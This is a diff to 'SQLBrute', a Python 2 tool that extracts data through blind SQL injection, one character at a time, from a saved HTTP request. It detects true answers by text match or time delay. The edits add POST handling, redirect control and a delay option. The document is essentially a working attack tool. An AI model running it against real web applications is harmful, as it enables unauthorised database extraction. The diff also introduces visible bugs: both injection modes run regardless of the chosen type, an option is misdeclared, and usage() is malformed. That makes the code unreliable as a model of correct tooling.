@@ -1,3 +1,13 @@
+'''\nSQLBrute
+
+Usage: python sqlbrute.py -i <inputfile> -s <sqlitype> [-t <textmatch>|-d <timedelay>]
+Arguments:
+ -i, --ifile        Input file. Defines the file containing your request.
+ -s, --sqlitype     SQL injection type. Can be either "text" or "time".
+ -t, --text         Should be defined if sqlitype="text". The text to look for in a true response
+ -d, --delay        Should be defined if sqlitype="time". The time delay a response will have if true.
+ -h, --help         This help file.
+'''
 import sys
 import getopt
 import re
@@ -13,6 +23,7 @@ charset = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
 protocol = 'http://'
 proxies = {'http': 'http://127.0.0.1:8080'}
 sleepTime = 0.1
+autoRedirects = False
 
 
 def sendRequest(headers):
@@ -21,9 +32,17 @@ def sendRequest(headers):
     requestType = headers['Type']
     tempHeaders = headers
     if (requestType == 'GET'):
-        response = requests.get(url, headers=tempHeaders, proxies=proxies)
-        content = response.content
-        return content
+        response = requests.get(url, headers=tempHeaders, proxies=proxies, allow_redirects=autoRedirects)
+        responseContent = response.content
+        responseHeaders = response.headers
+        return str(responseHeaders) + str(responseContent)
+    if (requestType == 'POST'):
+        DATA = headers['DATA']
+        del headers['DATA']
+        response = requests.post(url, data=DATA, headers=tempHeaders, proxies=proxies, allow_redirects=autoRedirects)
+        responseContent = response.content
+        responseHeaders = response.headers
+        return str(responseHeaders) + str(responseContent)
 
 
 def injectForText(headers, text):
@@ -38,12 +57,10 @@ def injectForText(headers, text):
     for header in headers:
         if (injectionText in headers[header]) and (injectionLength in headers[header]):
             urlpart1 = headers[header].split(injectionLength)[0]
-            urlpart2 = headers[header].split(injectionLength)[
-                1].split(injectionText)[0]
-            urlpart3 = headers[header].split(injectionLength)[
-                1].split(injectionText)[1]
+            urlpart2 = headers[header].split(injectionLength)[1].split(injectionText)[0]
+            urlpart3 = headers[header].split(injectionLength)[1].split(injectionText)[1]
             injectableHeader = header
-
+    print ''
     while (foundIt is False):
         substringCounter = substringCounter + 1
         foundChar = False
@@ -51,7 +68,6 @@ def injectForText(headers, text):
             if (foundChar is False):
                 payload = urlpart1 + \
                     str(substringCounter) + urlpart2 + str(i) + urlpart3
-                # print payload
                 headers[injectableHeader] = payload
                 response = sendRequest(headers)
                 print '{0}\r'.format(payload),
@@ -77,39 +93,58 @@ def parseRequest(inputfile):
             requestType = brokenline[0]
             requestURL = brokenline[1]
         else:
-            headers[brokenline[0].split(':')[0]] = brokenline[1].split('\n')[0]
+            if requestType == 'GET':
+                headers[brokenline[0].split(':')[0]] = brokenline[1].split('\n')[0]
+            elif requestType == 'POST':
+                if brokenline[0].split(':')[0] != brokenline[0]:
+                    headers[brokenline[0].split(':')[0]] = brokenline[1].split('\n')[0]
+                else:
+                    headers['DATA'] = line
     headers['Type'] = requestType
     headers['URL'] = requestURL.split(" ")[0]
     file.close()
     return headers
 
 
+def usage():
+    print sys.exit(__doc__)
+
+
 def main(argv):
     inputfile = ''
     sqlitype = ''
     text = ''
+    delay = ''
 
     try:
         opts, args = getopt.getopt(
-            argv, "hi:s:t:", ["ifile=", "sqlitype=", "textmatch="])
+            argv, "hi:s:t:d:", ["ifile=", "sqlitype=", "textmatch=", "delay"])
     except getopt.GetoptError:
-        print 'sqlbrute.py -i <inputfile> -s <sqlitype> -t <textmatch>'
-        sys.exit(2)
+        usage()
     for opt, arg in opts:
         if opt == '-h':
-            print 'sqlbrute.py -i <inputfile> -s <sqlitype> -t <textmatch>'
-            sys.exit()
+            usage()
         elif opt in ("-i", "--ifile"):
             inputfile = arg
         elif opt in ("-s", "--sqlitype"):
             sqlitype = arg
         elif opt in ("-t", "--text"):
             text = arg
-    headers = parseRequest(inputfile)
-    if sqlitype == 'text':
-        injectForText(headers, text)
-    elif sqlitype == 'time':
-        injectForTime(headers)
+        elif opt in ("-d", "--delay"):
+            delay = arg
+    if (inputfile == '') or ((sqlitype != 'text') and (sqlitype != 'time')):
+        usage()
+    else:
+        if (sqlitype == 'text') and (text == ''):
+            usage()
+        else:
+            headers = parseRequest(inputfile)
+            injectForText(headers, text)
+        if (sqlitype == 'time') and (delay == ''):
+            usage()
+        else:
+            headers = parseRequest(inputfile)
+            injectForTime(headers, delay)
 
 
 if __name__ == "__main__":
